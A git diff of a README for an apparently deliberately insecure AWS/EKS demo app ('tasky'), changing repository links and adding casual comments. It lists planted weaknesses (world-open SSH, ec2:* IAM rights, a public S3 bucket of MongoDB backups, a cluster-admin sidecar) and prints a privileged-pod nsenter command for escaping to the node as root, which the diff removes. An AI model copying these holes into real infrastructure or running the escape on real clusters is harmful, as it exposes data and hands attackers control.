@@ -29,41 +29,41 @@ All AWS resources will be provisioned and configured to support the tasky applic
 While the infrastructure is being provisioned review the resources that are being created.
 
 * Tasky Image
-  * [Dockerfile](https://github.com/ppresto/aws-tasky/blob/main/docker/Dockerfile.chainguard-static)
+  * [Dockerfile](https://github.com/jaseflash/aws-tasky/blob/main/docker/Dockerfile.chainguard-static)
 
 * AWS VPC
-  * [Configuration](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/locals-usw2.tf#L17)
-  * [terraform-aws-modules/vpc/aws](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf)
+  * [Configuration](https://github.com/jaseflash/aws-tasky/blob/main/quickstart/infra/locals-usw2.tf#L17)
+  * [terraform-aws-modules/vpc/aws](https://github.com/jaseflash/aws-tasky/blob/main/quickstart/infra/main.tf)
 
-* AWS EC2
-  * [Configuration](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf#L54)
-  * [IAM Profile](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2_iam_profile/iam-profile.tf)
+* AWS EC2 attach objects needed for S3 bucket
+  * [Configuration](https://github.com/jaseflash/aws-tasky/blob/main/quickstart/infra/main.tf#L54)
+  * [IAM Profile](https://github.com/jaseflash/aws-tasky/blob/main/modules/aws_ec2_iam_profile/iam-profile.tf)
     * Actions: "ec2:*","s3:GetObject","s3:PutObject","s3:PutObjectAcl","s3:DeleteObject","s3:ListBucket"
 
 * AWS Security Groups
-  * [EC2](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2/main.tf#L30)
+  * [EC2](https://github.com/jaseflash/aws-tasky/blob/main/modules/aws_ec2/main.tf#L30)
     * Ingress: Allow "0.0.0.0/0" -> TCP 22
     * Egress:  Allow "0.0.0.0/0: -> Any Protocol, Any Port
-  * [MongoDB](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2_sg_mongod/main.tf#L12)
+  * [MongoDB](https://github.com/jaseflash/aws-tasky/blob/main/modules/aws_ec2_sg_mongod/main.tf#L12)
     * Ingress: Allow "10.15.0.0/20" -> TCP 27017
 
 * AWS Route53
-  * [mongoDB record](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf#L82)
+  * [mongoDB record](https://github.com/jaseflash/aws-tasky/blob/main/quickstart/infra/main.tf#L82)
 
 * AWS S3
-  * [Public bucket](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf#L115)
+  * [Public bucket](https://github.com/jaseflash/aws-tasky/blob/main/quickstart/infra/main.tf#L115)
 
-* Mongo DB
-  * [DB build script](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_ec2/templates/mongo.sh)
+* Mongo DB ***Golden image always best repeatable and more secure ########
+  * [DB build script](https://github.com/jaseflash/aws-tasky/blob/main/modules/aws_ec2/templates/mongo.sh)
 
 Its recommended to shift left to the Infrastructure pipeline and use Packer to build the mongodb image.  Leverage your standard secrets mgmt solution to configure DB access to avoid leaking sensitive data in the process.  This image was created using Terraform's user_data to keep everything simple and using a single tool.
 
 * AWS EKS Cluster 1.29
-  * [Configuration](https://github.com/ppresto/aws-tasky/blob/main/quickstart/infra/main.tf#L129)
-  * [terraform-aws-modules/eks/aws](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_eks_cluster_alb/main.tf#L9)
+  * [Configuration](https://github.com/jaseflash/aws-tasky/blob/main/quickstart/infra/main.tf#L129)
+  * [terraform-aws-modules/eks/aws](https://github.com/jaseflash/aws-tasky/blob/main/modules/aws_eks_cluster_alb/main.tf#L9)
 
 * AWS Loadbalancer controller
-  * [AWS LB controller](https://github.com/ppresto/aws-tasky/blob/main/modules/aws_eks_cluster_alb/aws_alb_controller.tf) 
+  * [AWS LB controller](https://github.com/jaseflash/aws-tasky/blob/main/modules/aws_eks_cluster_alb/aws_alb_controller.tf) 
 
 This was installed as a best practice to support internal NLB or ALBs to EKS services.  The required public subnet tags were added as part of the VPC creation to enable the ALB to discover EKS services in the private subnets.
 
@@ -74,6 +74,10 @@ The Tasky app runs in EKS fronted by an ingress resource using an AWS ALB.  To g
 Connect to EKS using `scripts/kubectl_connect_eks.sh`.  Pass this script the path to the terraform state file used to provision the EKS cluster.  If cwd is ./infra like above then this command would look like the following:
 ```
 source ../../scripts/kubectl_connect_eks.sh .
+# Alias set in kubectl_connect_eks.sh ----> ###### optional for lazy typers like me :) #######
+
+alias kubectl=kubecolor ##### ____> colour.... as who doesnt like a little bit of sprinkling of colour looking at theor pods :) 
+
 kt get ingress
 ```
 This script connects EKS and builds some useful aliases shown in the output.
@@ -83,7 +87,7 @@ Use this URL to access the Tasky application.
 ```
 make getIngress
 
-Tasky URL - http://tasky-ingress-1379807902.us-west-2.elb.amazonaws.com
+Tasky URL - http://tasky-ingress-814997764.us-west-2.elb.amazonaws.com
 ```
 Login to verify Tasky is healthy and create tasks.  This mongodb will only accept internal requests from the VPC CIDR block.
 
@@ -91,6 +95,8 @@ Login to verify Tasky is healthy and create tasks.  This mongodb will only accep
 Verify the backups are going to S3, they are public, and can be downloaded.  Start by going to the S3 URL in your browser.
 ```
 terraform output bucket_url
+
+"usw2-shared-ext-mongodb" = "http://ext-mongodb-s3-backup.s3.us-west-2.amazonaws.com"
 ```
 You should see a list of .tar.gz files.  These are the DB backups happening every 5 minutes.  Copy one of the file names and update the URL with `/<filename>`.  This should download the exact file.
 
@@ -125,8 +131,9 @@ EC2 Discovery
 
 Find a public subnet that is routable from the internet and a security group you want to apply to your shadow instance
 ```
+aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId, InstanceType, SubnetId, PublicIpAddress]' --output table  #### ***** LIST of INSTANCES & SUBNETS *********
 aws ec2 describe-subnets --filters "Name=tag:Tier,Values=Public" | grep SubnetId
-aws ec2 describe-security-group-rules --query 'SecurityGroupRules[].[Description, GroupId, ToPort, CidrIpv4]' --output table
+
 ```
 
 EC2 key pair creation
@@ -135,7 +142,7 @@ ssh-keygen
 aws ec2 create-key-pair --key-name pp-keypair-test
 ```
 
-EC2 Instance Creation
+EC2 Instance Creation ******More secure WAYS**********
 ```
 aws ec2 run-instances \
   --image-id ami-07fe743f8d6d95a40 \
@@ -143,7 +150,7 @@ aws ec2 run-instances \
   --subnet-id subnet-06f0cbd01b59f1b53 \
   --security-group-ids sg-01c640cca4b063fbd \
   --associate-public-ip-address \
-  --key-name ppresto-ptfe-dev-key
+  --key-name jaseflash-ptfe-dev-key
 ```
 
 Get the external IP to SSH to the new instance
@@ -165,7 +172,11 @@ Is the application running with cluster-admin privileges?
   * Chainguard - Lightweight, distroless, hardened images with SBOMs and signatures. NO shell, package mgr,  Less attack surface and chance of CVEs
 
 ### Tasky sidecar has cluster-admin
+
+kubectl get pod tasky-66485c67cf-4r2p7 -n tasky  -o yaml
+
 The tasky pod is running a sidecar container `network-multitool`.  To see if containers have 
+s
 cluster-admin privilages connect to the sidecar, install `kubectl`, and use it to **escape into the Working Node as root!**
 ```
 curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
@@ -174,7 +185,7 @@ chmod 755 kubectl
 
 Escape into the Node as **root** with kubectl
 ```
-./kubectl run r00t --restart=Never -ti --rm --image tasky --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
+ ###### ****you cant see the container but with k9s.... exposes it for full view *******
 ```
 This one liner from Duffie Cooley spawns a new container named r00t based on alpine. The container is run in privileged mode ("privileged":true, so root gets all linux capabilities) "hostPID":true makes the container use the host's PID namespace (so the EKS Node) and the nsenter command is executing bin/bash with the context of another process (PID 1).
 
